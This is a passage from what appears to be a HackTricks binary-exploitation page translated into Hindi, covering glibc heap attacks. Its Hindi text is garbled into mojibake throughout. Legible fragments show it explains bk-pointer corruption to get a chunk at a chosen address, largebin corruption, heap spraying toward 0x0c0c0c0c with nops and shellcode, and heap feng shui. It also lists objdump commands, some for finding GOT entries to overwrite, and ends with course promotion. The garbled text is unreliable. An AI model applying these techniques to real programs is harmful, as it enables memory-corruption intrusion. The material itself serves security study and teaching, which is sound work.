‡§è‡§ï ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§Ø‡§π ‡§Ö‡§™‡§®‡•á ‡§¨‡§ø‡§® ‡§Æ‡•á‡§Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§á‡§∏‡§ï‡•á bk ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§â‡§∏ ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§∏‡§Æ‡§Ø ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§π‡§Æ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞, ‡§¨‡§ø‡§® ‡§ï‡•ã ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§¨‡§æ‡§∞ malloc() ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï‡•ç‡§∑‡§æ ‡§ï‡§∞‡§®‡•Ä ‡§π‡•ã‡§ó‡•Ä ‡§§‡§æ‡§ï‡§ø ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§¨‡§ø‡§® ‡§ï‡§æ ‡§™‡•Å‡§®‡§É ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§î‡§∞ ‡§¨‡§ø‡§® ‡§ï‡•ã ‡§ß‡•ã‡§ñ‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á, ‡§Ø‡§π ‡§∏‡•ã‡§ö‡§ï‡§∞ ‡§ï‡§ø ‡§Ö‡§ó‡§≤‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§ù‡•Ç‡§†‡•á ‡§™‡§§‡•á ‡§™‡§∞ ‡§π‡•à‡•§ ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§π‡§Æ‡•á‡§Ç ‡§µ‡§π ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ ‡§ú‡•ã ‡§π‡§Æ‡•á‡§Ç ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•ã ‡§Ø‡§•‡§æ‡§∂‡•Ä‡§ò‡•ç‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§¶‡§∞‡•ç‡§∂ ‡§∞‡•Ç‡§™ ‡§∏‡•á: ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§£, ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§£, ‡§á‡§∏ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§∞‡§®‡§æ, ‡§è‡§ï ‡§¨‡§°‡§º‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§£ ‡§ú‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ (‡§ï‡§Æ‡§ú‡•ã‡§∞‡•Ä), ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§è‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§î‡§∞ ‡§è‡§ï ‡§∏‡§Æ‡§æ‡§® ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡§æ ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§î‡§∞ ‡§Ø‡§π ‡§µ‡§π ‡§π‡•ã‡§ó‡§æ ‡§ú‡•ã ‡§ö‡•Å‡§®‡•á ‡§ó‡§è ‡§™‡§§‡•á ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•Ä ‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ø‡§π ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§ï‡§ø ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‚Äú‡§ù‡•Ç‡§†‡§æ‚Äù ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à: ‡§Ø‡§π ‡§ú‡§æ‡§Ç‡§ö‡§§‡§æ ‡§π‡•à ‡§ï‡§ø bck->fd victim ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à‡•§ ‡§Ö‡§∞‡•ç‡§•‡§æ‡§§‡•ç, ‡§π‡§Æ‡§æ‡§∞‡•á ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§Ø‡§¶‡§ø ‡§ù‡•Ç‡§†‡•á ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡§æ fd* ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç victim ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§∂‡§æ‡§∞‡§æ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã ‡§ï‡§ø‡§∏‡•Ä ‡§® ‡§ï‡§ø‡§∏‡•Ä ‡§§‡§∞‡§π (‡§∏‡§Ç‡§≠‡§µ‡§§‡§É ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á) ‡§∏‡§π‡•Ä ‡§™‡§§‡•á ‡§™‡§∞ victim ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§è‡§ï ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§ü‡•Å‡§ï‡§°‡§º‡§æ ‡§™‡•ç‡§∞‡§§‡•Ä‡§§ ‡§π‡•ã‡•§

**LargeBin ‡§ï‡§æ ‡§≠‡•ç‡§∞‡§∑‡•ç‡§ü‡§æ‡§ö‡§æ‡§∞**

‡§™‡§π‡§≤‡•á ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ‡§è‡§Å ‡§î‡§∞ ‡§ï‡•Å‡§õ ‡§î‡§∞, ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•á 512 ‡§∏‡•á ‡§¨‡§°‡§º‡•á ‡§π‡•ã‡§®‡•á ‡§ö‡§æ‡§π‡§ø‡§è‡•§

‡§π‡§Æ‡§≤‡§æ ‡§™‡§ø‡§õ‡§≤‡•á ‡§ú‡•à‡§∏‡§æ ‡§π‡•Ä ‡§π‡•à, ‡§Ö‡§∞‡•ç‡§•‡§æ‡§§‡•ç, bk ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à ‡§î‡§∞ ‡§∏‡§≠‡•Ä ‡§â‡§® malloc() ‡§ï‡•â‡§≤ ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§≤‡•á‡§ï‡§ø‡§® ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§ï‡•á ‡§Ü‡§ï‡§æ‡§∞ ‡§ï‡•ã ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ï‡§ø ‡§µ‡§π size - nb < MINSIZE ‡§π‡•ã‡•§

‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, size ‡§ï‡•ã 1552 ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§≤‡§®‡•á ‡§∏‡•á 1552 - 1544 = 8 < MINSIZE ‡§π‡•ã‡§ó‡§æ (‡§ò‡§ü‡§æ‡§µ ‡§®‡§ï‡§æ‡§∞‡§æ‡§§‡•ç‡§Æ‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π unsigned ‡§ï‡•Ä ‡§§‡•Å‡§≤‡§®‡§æ ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à)‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§á‡§∏‡•á ‡§î‡§∞ ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§ü‡§ø‡§≤ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§™‡•à‡§ö ‡§≤‡§æ‡§ó‡•Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§

**‡§π‡•Ä‡§™ ‡§∏‡•ç‡§™‡•ç‡§∞‡•á‡§á‡§Ç‡§ó**

‡§Ø‡§π ‡§Æ‡•Ç‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§π‡•Ä‡§™ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§∏‡§Ç‡§≠‡§µ ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§á‡§∏‡•á ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§®‡•á ‡§µ‡§æ‡§≤‡•á nops ‡§ï‡•á ‡§ó‡§¶‡•ç‡§¶‡•á ‡§∏‡•á ‡§≠‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§ó‡§¶‡•ç‡§¶‡•á ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç 0x0c ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π 0x0c0c0c0c ‡§ï‡•á ‡§™‡§§‡•á ‡§™‡§∞ ‡§ï‡•Ç‡§¶‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§î‡§∞ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§Ø‡§¶‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§™‡§§‡•á ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§ï‡•â‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§§‡•ã ‡§Ø‡§π ‡§µ‡§π‡§æ‡§Ç ‡§ï‡•Ç‡§¶ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§ ‡§Æ‡•Ç‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∞‡§£‡§®‡•Ä‡§§‡§ø ‡§Ö‡§ß‡§ø‡§ï‡§§‡§Æ ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§¶‡•á‡§ñ‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§ï‡•ã‡§à ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à ‡§î‡§∞ 0x0c0c0c0c ‡§™‡§∞ ‡§ï‡•Ç‡§¶‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡•Ä ‡§ú‡§æ ‡§∞‡§π‡•Ä ‡§π‡•à, ‡§Ø‡§π ‡§â‡§Æ‡•ç‡§Æ‡•Ä‡§¶ ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è ‡§ï‡§ø ‡§µ‡§π‡§æ‡§Ç nops ‡§π‡•à‡§Ç‡•§

**‡§π‡•Ä‡§™ ‡§´‡•á‡§Ç‡§ó ‡§∂‡•Å‡§à**

‡§Ø‡§π ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§î‡§∞ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•ã ‡§á‡§∏ ‡§§‡§∞‡§π ‡§∏‡•á ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à ‡§ï‡§ø ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•ã‡§Ç ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§Ü‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ü‡•Å‡§ï‡§°‡§º‡•á ‡§π‡•ã‡§Ç‡•§ ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§¨‡§´‡§∞ ‡§á‡§®‡§Æ‡•á‡§Ç ‡§∏‡•á ‡§è‡§ï ‡§Ö‡§Ç‡§°‡•á ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•ã‡§ó‡§æ‡•§

**objdump -d ejecutable** ‚Äî> ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§Ç‡§∏ ‡§ï‡•ã ‡§°‡§ø‡§∏‡§æ‡§∏‡•á‡§Æ‡•ç‡§¨‡§≤ ‡§ï‡§∞‡•á‡§Ç\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡§æ ‡§™‡§§‡§æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç\
**objdump -d -Mintel ./shellcodeout** ‚Äî> ‡§Ø‡§π ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø ‡§Ø‡§π ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡§æ‡§∞‡•Ä ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§π‡•à ‡§î‡§∞ ‡§ë‡§™‡§ï‡•ã‡§° ‡§®‡§ø‡§ï‡§æ‡§≤‡•á‡§Ç\
**objdump -t ./exec | grep varBss** ‚Äî> ‡§™‡•ç‡§∞‡§§‡•Ä‡§ï ‡§§‡§æ‡§≤‡§ø‡§ï‡§æ, ‡§µ‡•á‡§∞‡§ø‡§è‡§¨‡§≤ ‡§î‡§∞ ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§Ç‡§∏ ‡§ï‡•á ‡§™‡§§‡•á ‡§®‡§ø‡§ï‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> ‡§™‡•Å‡§∏‡•ç‡§§‡§ï‡§æ‡§≤‡§Ø ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§Ç‡§∏ ‡§ï‡•á ‡§™‡§§‡•á ‡§®‡§ø‡§ï‡§æ‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> GOT ‡§Æ‡•á‡§Ç ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è puts ‡§ï‡§æ ‡§™‡§§‡§æ ‡§®‡§ø‡§ï‡§æ‡§≤‡•á‡§Ç\
**objdump -D ./exec** ‚Äî> ‡§∏‡§≠‡•Ä ‡§ï‡•ã ‡§°‡§ø‡§∏‡§æ‡§∏‡•á‡§Æ‡•ç‡§¨‡§≤ ‡§ï‡§∞‡•á‡§Ç ‡§ú‡§¨ ‡§§‡§ï ‡§ï‡§ø plt ‡§ï‡•á ‡§™‡•ç‡§∞‡§µ‡•á‡§∂ ‡§® ‡§π‡•ã‡§Ç\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** gdb ‡§Æ‡•á‡§Ç ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

## ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§™‡§æ‡§†‡•ç‡§Ø‡§ï‡•ç‡§∞‡§Æ

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks** ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
